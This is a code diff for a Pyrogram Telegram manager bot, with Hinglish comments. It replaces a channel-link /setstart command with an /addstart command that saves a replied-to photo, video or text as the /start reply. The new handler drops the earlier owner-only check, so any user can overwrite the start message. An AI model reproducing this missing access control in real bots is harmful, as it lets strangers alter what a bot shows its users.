@@ -598,55 +477,40 @@ async def ad_filter_func(_, __, message):
 ad_filter = filters.create(ad_filter_func)
 
 
-# ==================== MAIN BOT START HANDLER ====================
-# YAHAN PE EXACT QUOTE (REPLY) KAREGA JAISE PURANA KARTA THA
+# ==================== MAIN MANAGER BOT LOGIC ====================
 
-@bot.on_message(filters.command("setstart") & filters.user(OWNER_ID))
-async def set_start_cmd(client, message):
-    global START_CHAT_ID, START_MSG_ID
-    if len(message.command) < 2:
-        await message.reply("❌ Usage: `/setstart <link>`")
+@bot.on_message(filters.command("addstart"))
+async def save_start_with_media(client, message):
+    global START_DATA
+    if not message.reply_to_message:
+        await message.reply_text("⚠️ Bhai, pehle message (photo/video/text) bhejo, fir us par reply karke `/addstart` likho!")
         return
-    link = message.command[1]
-    try:
-        parts = link.rstrip("/").split("/")
-        START_MSG_ID = int(parts[-1])
-        chat_part = parts[-2]
-        START_CHAT_ID = int(f"-100{chat_part}") if chat_part.isdigit() else chat_part
-        await message.reply(f"✅ **Start message updated!**")
-    except Exception as e:
-        await message.reply(f"❌ **Invalid link:** `{e}`")
+    reply = message.reply_to_message
+    if reply.photo:
+        START_DATA.update({"type": "photo", "file_id": reply.photo.file_id, "text": reply.caption, "entities": reply.caption_entities})
+        await message.reply_text("🖼️ Photo aur Premium Emojis dono save ho gaye!")
+    elif reply.video:
+        START_DATA.update({"type": "video", "file_id": reply.video.file_id, "text": reply.caption, "entities": reply.caption_entities})
+        await message.reply_text("🎥 Video aur Premium Emojis dono save ho gaye!")
+    elif reply.text:
+        START_DATA.update({"type": "text", "file_id": None, "text": reply.text, "entities": reply.entities})
+        await message.reply_text("📝 Text aur Premium Emojis save ho gaye!")
+    else:
+        await message.reply_text("⚠️ Ye format support nahi kar raha, bhai. Photo, Video ya Text bhejo.")
 
-@bot.on_message(filters.command("start") & filters.private)
+@bot.on_message(filters.command("start"))
 async def start_cmd(client, message):
-    if not START_CHAT_ID or not START_MSG_ID:
-        await message.reply("Hᴇʏ! Start message abhi set nahi hai.\nOwner ko bolo `/setstart <link>` use karke pehle message set kare ✨", quote=True)
-        return
-    
     try:
-        # Channel se message get karna 
-        m = await client.get_messages(START_CHAT_ID, START_MSG_ID)
-        
-        if not m:
-            return await message.reply("❌ Message nahi mila channel me.", quote=True)
-            
-        # Exact quote karke user ko send karna (Photo/Video/Text)
-        if m.photo:
-            await message.reply_photo(photo=m.photo.file_id, caption=m.caption or "", caption_entities=m.caption_entities, quote=True)
-        elif m.video:
-            await message.reply_video(video=m.video.file_id, caption=m.caption or "", caption_entities=m.caption_entities, quote=True)
-        elif m.text:
-            await message.reply_text(text=m.text, entities=m.entities, quote=True)
+        if START_DATA["type"] == "photo" and START_DATA["file_id"]:
+            await message.reply_photo(photo=START_DATA["file_id"], caption=START_DATA["text"], caption_entities=START_DATA["entities"])
+        elif START_DATA["type"] == "video" and START_DATA["file_id"]:
+            await message.reply_video(video=START_DATA["file_id"], caption=START_DATA["text"], caption_entities=START_DATA["entities"])
+        elif START_DATA["type"] == "text" and START_DATA["text"]:
+            await message.reply_text(text=START_DATA["text"], entities=START_DATA["entities"])
         else:
-            await client.copy_message(chat_id=message.chat.id, from_chat_id=START_CHAT_ID, message_id=START_MSG_ID, reply_to_message_id=message.id)
-            
-    except PeerIdInvalid:
-        await message.reply("⚠️ **Pyrogram ko channel ka rasta nahi mil raha.**\n\n🛠 **Solve kaise karein:**\nBot ko channel me admin bana rakha hai toh, apne channel me jao aur bas `Hi` likh kar bhej do bot ko. Bot update pakad lega aur error hat jayega!", quote=True)
+            await message.reply_text("Hᴇʏ! 1 2 3... Sᴛᴀʀᴛ ᴍᴇssᴀɢᴇ sᴇᴛ ᴋᴀʀᴏ ʙʜᴀɪ ✨\n(Send media and reply with /addstart)")
     except Exception as e:
-        await message.reply(f"❌ **Error:** `{e}`", quote=True)
-
-
-# ==================== SESSION ADDER ====================
+        await message.reply_text(f"Error aagaya bhai: {e}")
 
 @bot.on_message(filters.command("add") & filters.private)
 async def add_session_handler(client, message):
@@ -704,7 +568,7 @@ async def add_session_handler(client, message):
     except Exception as e:
         await msg.edit(f"❌ **Connection Failed!**\nError: {e}")
 
-print("✅ Magma Manager Bot Online!")
+print("✅ Magma Manager & Pro Media Bot Online!")
 
 keep_alive()
 bot.run()
